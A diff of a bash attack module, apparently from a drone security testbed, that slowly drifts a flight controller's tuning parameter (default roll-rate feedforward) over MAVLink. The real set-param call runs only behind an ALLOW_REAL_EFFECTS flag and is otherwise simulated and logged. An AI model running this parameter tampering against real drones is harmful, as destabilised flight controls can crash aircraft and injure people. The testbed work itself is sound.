@@ -1,30 +1,29 @@
 #!/usr/bin/env bash
+# Slow param drift against FCU via MAVLink
 set -euo pipefail
-ATTACK_NAME="mavlink_param_drift"
-. "$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")"/.. && pwd)/sh_core/attack_std.shlib"
+BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+. "$BASE/00_env.sh"; . "$BASE/sh_core/lpc_bus.sh"; . "$BASE/sh_core/metrics.sh"
 
-: "${INTENSITY:=low}"
-: "${PARAM_NAME:=AUTO}"
-: "${STEP_SIZE:=auto}"
-
-SAFE_PARAMS=("ATC_RAT_RLL_FF" "ATC_RAT_PIT_FF" "PSC_POSXY_P" "ATC_ANG_RLL_P" "PSC_POSZ_P")
+: "${PARAM_NAME:=ATC_RAT_RLL_FF}"
+: "${INTENSITY:=low}"   # low|medium|high
+: "${DUR:=1}"
 
 case "$INTENSITY" in
-  low)    STEP_SIZE=${STEP_SIZE/auto/0.005} ;;
-  medium) STEP_SIZE=${STEP_SIZE/auto/0.015} ;;
-  high)   STEP_SIZE=${STEP_SIZE/auto/0.030} ;;
+  low) STEP=0.005 ;; medium) STEP=0.02 ;; high) STEP=0.05 ;;
 esac
 
-_act(){
-  local actual_param="$PARAM_NAME"
-  if [[ "$PARAM_NAME" == "AUTO" ]]; then
-    local idx=$((RANDOM % ${#SAFE_PARAMS[@]}))
-    actual_param="${SAFE_PARAMS[$idx]}"
+main(){
+  log "[mavlink_param_drift] mode=$LPC_MODE param=$PARAM_NAME step=$STEP dur=$DUR"
+  local before after; before=$(obs_snapshot "$DVD_C_GCS" "$DVD_TARGET_IF")
+  if [ "${ALLOW_REAL_EFFECTS:-0}" -eq 1 ]; then
+    python3 "$BASE/interface/mavlink_cmd.py" --host "$DVD_MAVLINK_HOST" --port "$DVD_MAVLINK_PORT" \
+      set-param "$PARAM_NAME" "$STEP" || true
+    bus_emit "mavlink" "action=param_set name=$PARAM_NAME step=$STEP target=${DVD_MAVLINK_HOST}:${DVD_MAVLINK_PORT}"
+  else
+    bus_emit "mavlink" "action=param_drift_sim name=$PARAM_NAME step=$STEP"
+    effect_emit "mission_bias=+$STEP"
   fi
-  local noise; noise=$(awk "BEGIN {srand(); print (rand()-0.5)*$STEP_SIZE*0.5}")
-  local step;  step=$(awk "BEGIN {print $STEP_SIZE + $noise}")
-  _log_bus "$ATTACK_NAME" "intensity=$INTENSITY" "param=$actual_param" "step=$step" "noise=$noise"
-  return 0
+  sleep "$DUR"
+  after=$(obs_snapshot "$DVD_C_GCS" "$DVD_TARGET_IF"); delta_emit "$before" "$after" "mavlink_obs"
 }
-
-run_lpc_loop _act "${DUR:-0}"
+main "$@"
